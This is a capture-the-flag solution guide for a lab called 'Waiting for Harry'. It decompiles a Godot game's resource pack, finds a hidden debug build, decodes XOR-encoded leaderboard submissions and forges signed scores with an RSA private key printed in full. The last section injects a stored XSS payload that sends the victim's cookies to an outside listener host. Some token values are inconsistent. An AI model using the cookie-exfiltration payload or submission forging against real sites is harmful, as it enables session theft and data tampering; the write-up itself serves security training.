# Waiting for Harry

*Solution Guide*

## Overview

Waiting for Harry requires a broad understanding of reverse engineering, familiarity with multiple languages, and comfort with a variety of web vulnerabilities.

## Broad Strokes of Solution
- Decompile the PCK
- Get Token From Addons
- Escalate to Debug Mode via The Left in drag end function
- Get Token From Index on Debug Build
- Find submit logic
- Decrypt the Submit Request To Get the Token
- Execute an XSS Attack 
- Exfiltrate Cookies From Harry

### Resource

To quickly extract the code from this file you can use [`codedown`](https://earldouglas.github.io/codedown/)

## Question 1
***We're going to need to look at the game to access the leaderboard. What's the token in the game source code?***

Before we can attempt to exfiltrate the data from Harry, we need to get a run-down of the site.

> When you are first accessing this site you may see one of the two following pages
> ![Webpage With Yellow Warning Sign That Says Warning Potential Risk Ahead](./img/recon_0_0.png)
> ![Webpage That Reads Gateway Unavailable](./img/recon_0_1.png)
> If you see the first you can just press advanced and then press continue
> If you see the second you just need to wait long enough for it to finish booting.

1) First, there's the leaderboard. This is the only thing we know that Harry will access and where the final exploit will have to occur. Looking at it, we can see that there is no javascript on the page beyond bootstrap. This likely means we are dealing with a `Server-Side Rendering` pipeline that once we can make calls to, we will need to take advantage of somehow.

![Webpage with a table on it that tells you the highest score for this game is two million and shows that the only script loaded on the page is bootstrap](img/recon_1_0.png)

2) Then, we look at the game. First thing of note is that it is using the Godot game engine. 

![Webpage Showing the Godot Logo as the game loads](img/recon_2_0.png)

We see two buttons that we explore

![Webpage Showing Two Different Buttons That We Can Click](img/recon_2_1.png)

3) There is a settings page that supposedly lets us set the volume but we can't actually hear anything so we don't know if it does anything.

![Volume Slider on Game Settings Page](img/recon_2_2.png)

4) Trying to play the game shows us that there is submission logic built-in to the game itself as when you finish playing it allows you to to submit your score to the leaderboard alongside a 3 character name.

![Submit Screen for The Game](img/recon_2_3.png)

5) When we press submit if we look at the network requests we can see that it makes a call to the submit endpoint on the backend alongside some kind of encoded body. 

![Submit Request Data in Encoded Format](img/recon_2_4.png)

However it's unclear as to how exactly they are processing the body. So we're gonna need to figure that out later. 

6) Looking at other network requests made by the game, we can see a plethora of things downloaded over the network.

![Network Requests Made by The Webpage](img/recon_2_5.png)

7) The first two that stick out are `index.wasm` and `index.side.wasm` as those contain the game engine and extension we are seeing. We can confirm that by looking at the code in `index.js`.

Second, the `index.pck`. `PCK` files are a specialized format for distributing Godot game resources. So there might something interesting in there. However, we're going to need a specialized tool to recover anything from there so let's keep looking for just a bit.

Third, the `rust.nothreads.wasm` file provides an indication (though possible red herring) that they are using rust to write some of their code and then compiling that to wasm. So we will probably need to access the code in there as well.

💡 Something to note about Godot is that the engine is primarily distributed as a standalone component that can then incorporate other pieces in. So, in this case, we can safely ignore the `index.wasm` and `index.side.wasm` for now. We also need to consider that to work with the `rust.nothreads.wasm` we will need to do some heavy reverse engineering so let's focus on the `index.pck`.

8) There's a tool that exists for decompiling `PCK` files. It's called `gdsdecomp`, it's provided by the challenge, and it's designed exactly for this use case. They have a headless version of the tool that I'll be using for this walkthrough, but you can use the GUI version just as easily.

### Game Resource Pack Retrieval Tool

```python
import pathlib
import requests
import zipfile
import io
from sh import Command

BIN_PATH = pathlib.Path("bin")
BIN_PATH.mkdir(exist_ok=True)

GAME_PATH = BIN_PATH / "game.pck"
GAME_URL = "https://dodgethecreeps/index.pck"

if not GAME_PATH.exists():
    with requests.get(GAME_URL, stream=True, verify=False) as response, open(GAME_PATH, "wb") as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)

TOOLS_PATH = pathlib.Path("tools")
TOOLS_PATH.mkdir(exist_ok=True)

GDRE_TOOLS_PATH = TOOLS_PATH / "gdre_tools.x86_64"

if not GDRE_TOOLS_PATH.exists():
    # Download the zip file
    url = "https://dodgethecreeps/tools/gdre_tools_linux_x86_64.zip"
    response = requests.get(url, verify=False)
    response.raise_for_status()

    # Unzip to "tools" directory
    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
        z.extractall("tools")

    print("Downloaded and extracted GDRE_tools to ./tools")
else:
    print("GDRE_tools is already downloaded and extracted.")

chmod = Command("chmod")
chmod('+x', 'tools/gdre_tools.x86_64')
gdsdecomp = Command("tools/gdre_tools.x86_64")

result = gdsdecomp('--headless', '--recover=bin/game.pck', f'--output=game')
if result is None:
    print("Decompilation failed.")
elif isinstance(result, str):
    print(result)
else:
    print(result.wait())
```

### Breakdown of Script

First, I will be:

- installing `requirements.txt` outside of the notebook to handle downloading the `PCK` and running `gdsdecomp` in the notebook.
- Get everything set up to run the commands I need

```python
import pathlib
import requests
import zipfile
import io
from sh import Command
```

- Download the game resource pack

```python
BIN_PATH = pathlib.Path("bin")
BIN_PATH.mkdir(exist_ok=True)

GAME_PATH = BIN_PATH / "game.pck"
GAME_URL = "https://dodgethecreeps/index.pck"

if not GAME_PATH.exists():
    with requests.get(GAME_URL, stream=True, verify=False) as response, open(GAME_PATH, "wb") as file:
        for chunk in response.iter_content(chunk_size=8192):
            file.write(chunk)
```

- Download the GDRE Tools for decompilation

```python
TOOLS_PATH = pathlib.Path("tools")
TOOLS_PATH.mkdir(exist_ok=True)

GDRE_TOOLS_PATH = TOOLS_PATH / "gdre_tools.x86_64"

if not GDRE_TOOLS_PATH.exists():
    # Download the zip file
    url = "https://dodgethecreeps/tools/gdre_tools_linux_x86_64.zip"
    response = requests.get(url, verify=False)
    response.raise_for_status()

    # Unzip to "tools" directory
    with zipfile.ZipFile(io.BytesIO(response.content)) as z:
        z.extractall("tools")

    print("Downloaded and extracted GDRE_tools to ./tools")
else:
    print("GDRE_tools is already downloaded and extracted.")
```

- Turn them into functions that can be utilized

```python
chmod = Command("chmod")
chmod('+x', 'tools/gdre_tools.x86_64')
gdsdecomp = Command("tools/gdre_tools.x86_64")
```

- And finally, try to run recovery on the `PCK` file

```python
result = gdsdecomp('--headless', '--recover=bin/game.pck', f'--output=game')
if result is None:
    print("Decompilation failed.")
elif isinstance(result, str):
    print(result)
else:
    print(result.wait())
```

9) Ok, we've extracted the game resources. Let's poke around inside.

There's a decent chunk of stuff in there. And it looks like there's not much code in here. Mostly assets. However, it looks like they are loading in a gdextension which provides further indication that they are compiling something to wasm.

![File Explorer Showing the Contents of The Decompiled PCK](img/index_1_0.png)

However there appear to be two interesting things that we can find here.

Here we find that there is a token in the `addons/anti-cheating/ac_node.gd` file.

```gdscript
var TOKEN = "<__YOUR_RANDOMLY_GENERATED_TOKEN__>"
```

![Image of token 1 received](img/index_token1.png)

## Answer

The answer to this Question is the value of `PCCC{RDHV-7423}` which is found in the `var TOKEN` line of `ac_node.gd`.

## Question 2
***To make it easier to analyze the game, we need to enable `debug mode`. Find a way to enable it and discover the token that is now revealed in `index.html`?***

1) Based on the question presented, we can start to search for references to `debug` mode by looking for strings such as `debug` and `debug mode` in the files we just downloaded. From the `parent` folder of the directory where you downloaded the game folders and files, run the following command:

**Command**

```bash
grep -nr "debug mode" *
```

**Output**

```bash
┌──(user㉿aac74c573c03)-[~/waiting]
└─$ grep -nr "debug mode" *
game/hud/settings.gd:17:     # TODO: Switching to debug mode should be deleted before we make the game public
```

Let's follow this hunch and examine the file in question (`game/hud/settings.gd`).

2) When examining `game/hud/settings.gd`, we find that there appears to be a remnant script here that should switch us to debug mode by `changing the current window href` to what appears to be a url of a debug build for the current webpage (so we can just go there directly if we'd like).

```gdscript
func _on_drag_ended(value_changed: bool) -> void:
	# TODO: Switching to debug mode should be deleted before we make the game public
	# Especially because they want everything to be in rust not in the easier language :(
	if value_changed:
		var slider_value = $VolumeSlider.value
		volume = slider_value
		swipes += 1;
		print("Another swipe")
		if swipes > 8:
			JavaScriptBridge.eval("window.location.href = 'https://dodgethecreeps/debug/index.html';", true);
```

3) With this new information in hand, let's go ahead and activate debug mode by **navigating** to `http://dodgethecreeps/debug/index.html`. The first thing I notice is that there does not appear to be much difference in the actual game, though through inspecting `index.html`, we find that there is a new `TOKEN` variable:

![Dodge the Creeps in Debug Mode](img/debug_1_0.png)

```html
<script>
	// Truncated for Brevity...
	            // TOKEN CDdRWQIG-0729}
	// Truncated for Brevity...
</script>
```

4) We can copy and paste the HTML into another file for examination; the result will be as is seen in the image below:

![Image of debugged index.html file](img/debug_1_2.png)

## Answer

As can be seen in the image, the token corresponding to this question is `PCCC{eEmg-1174}`.

## Question 3
***Reverse engineer the game's logic and determine what token is found when submitting a request to the leaderboard?***

To complete this task, we must first reverse engineer how the game is compilled. Debug mode does appear to have bundled source maps so we can actually look at the code that's compiled to wasm.

![Dodge the Creep Debug Mode Debugger now has source maps available](img/debug_1_1.png)

3) A little bit of investigation of the source map and what catches my eye is the `src/hud/end.rs` file as earlier we noted that there was some kind of encoding applied to the submission body after you had finished playing the game.

4) Inside of that file I find two very interesting pieces of code. First, we find that the token is injected at runtime so we cannot get it from the source map:

**Article 1**

```rust
// This token will be automatically replaced at runtime by the server
const TOKEN: &str = "____TOKEN_____";
```

Additionally, the code that actually handles signing and encoding the submission:

**Article 2**

```rust
#[func]
fn submit_to_leaderboard(&self) {
	let name = self.base().get_node_as::<LineEdit>("Name").get_text();
	let data = (vdict! {
		"name": name,
		"score": self.score,
		"token": TOKEN,
	}).to_variant();
	let json = godot::classes::Json::stringify(&data);
	let mut key = godot::classes::CryptoKey::new_gd();
	key.load_from_string(PRIVATE_KEY);
	let mut crypto = godot::classes::Crypto::new_gd();
	let signature = crypto.sign(HashType::SHA256, &json.sha256_buffer(), &key);
	let json = json.chars().iter().flat_map(|c| (u32::from(*c) ^ 0xDEAD).to_be_bytes()).collect();
	let mut http_request = self.base().get_node_as::<godot::classes::HttpRequest>("HTTPRequest");
	http_request
		.request_raw_ex("https://dodgethecreeps/submit")
		.method(godot::classes::http_client::Method::POST)
		.custom_headers(&PackedStringArray::from(&[
			"User-Agent: DodgedTheCreepsGameAgent".into(),
			(&format!("Data-Signature: {}", signature.hex_encode())).into(),
			"Content-Type: application/dtc+binary".into(),
		]))
		.request_data_raw(&json)
		.done();
}
```

5) At this point, we can now take the body of the submission that we got earlier and extract the token. Then, we can craft a function that will allow us to submit our own scores to the leaderboard.

```python
from itertools import batched

def decode_submission(submission: bytes) -> str:
    return ''.join(chr(int.from_bytes(i, 'big') ^ 0xDEAD) for i in batched(submission, 4, strict=True))

body = b"\x00\x00\xde\xd6\x00\x00\xde\x8f\x00\x00\xde\xc3\x00\x00\xde\xcc\x00\x00\xde\xc0\x00\x00\xde\xc8\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x8f\x00\x00\xde\x8f\x00\x00\xde\x81\x00\x00\xde\x8f\x00\x00\xde\xde\x00\x00\xde\xce\x00\x00\xde\xc2\x00\x00\xde\xdf\x00\x00\xde\xc8\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x98\x00\x00\xde\x81\x00\x00\xde\x8f\x00\x00\xde\xd9\x00\x00\xde\xc2\x00\x00\xde\xc6\x00\x00\xde\xc8\x00\x00\xde\xc3\x00\x00\xde\x8f\x00\x00\xde\x97\x00\x00\xde\x8f\x00\x00\xde\xce\x00\x00\xde\xc4\x00\x00\xde\xe1\x00\x00\xde\xf5\x00\x00\xde\xdb\x00\x00\xde\xc3\x00\x00\xde\xca\x00\x00\xde\xf7\x00\x00\xde\x80\x00\x00\xde\x98\x00\x00\xde\x94\x00\x00\xde\x9a\x00\x00\xde\x9e\x00\x00\xde\x9e\x00\x00\xde\x8f\x00\x00\xde\xd0"
print(decode_submission(body))
```

## Answer

The answer to this Question is the value of `const TOKEN`'s assignment which is `PCCC{JFtB-7306}`.

## Question 4
***We need to know what was put in Harry's cookie jar to get the sensitive information. What is the value of the cookie named "flag"?***

1) First, let's make a quick helper function for submitting things to the leaderboard and see what we can do:

```python
import json
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, utils, rsa
from cryptography.hazmat.primitives import serialization
PRIVATE_KEY = serialization.load_pem_private_key(
    "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----".encode(),
    password=None
)


def submit_to_leaderboard(body):
    message = json.dumps(body)
    hasher = hashes.Hash(hashes.SHA256())
    hasher.update(message.encode('utf-8'))
    message_hash = hasher.finalize()
    assert isinstance(PRIVATE_KEY, rsa.RSAPrivateKey)
    signature = PRIVATE_KEY.sign(message_hash, padding.PKCS1v15(), utils.Prehashed(hashes.SHA256()))
    # This has to use localhost for testing but once on platform 
    # can use server instead
    message = b''.join((ord(c) ^ 0xDEAD).to_bytes(4, 'big') for c in message)
    response = requests.post("https://dodgethecreeps/submit", verify=False, data=message, headers={
        "content-type": "application/json",
        "Data-Signature": signature.hex()
    })
    
    print(response)

if __name__ == __main__:
	submit_to_leaderboard(body)
```

2) Now, let's validate that our submission logic is right.

```python
submit_to_leaderboard({'name': 'TTT', 'score': 2_000_000})
```

Well done! We're on the leaderboard!

![Leaderboard with TTT on it](img/board_0_0.png)

2) Next, let's see if they do any HTML sanitation:

```python
submit_to_leaderboard({'name': 'PWN<div></div>', 'score': 2_000_001})
```

![Leaderboard with our submission that has a div in it without the div showing](img/board_1_0.png)

3) Nope! Well then, this should be easy. Let's go ahead and write a quick script to exfiltrate the data from Harry and submit it to the leaderboard.

```python
submit_to_leaderboard({
    'name': "<img src=x onerror=this.src='https://listener/200/'+document.cookie;>",
    'score': 2_000_000
})
```

4) Let's give Harry a moment and then retrieve the logs.

```python
import time
time.sleep(10)
response = requests.get("https://listener/logs", verify=False)
logs = response.json()
print(logs)
```

Looks like Harry has been visiting the Leaderboard since we made our submission and there's our flag!

## Answer

The answer to this Question is `"PCCC{hCAb-1080}"`.

**This consludes the solution guide for this challenge.**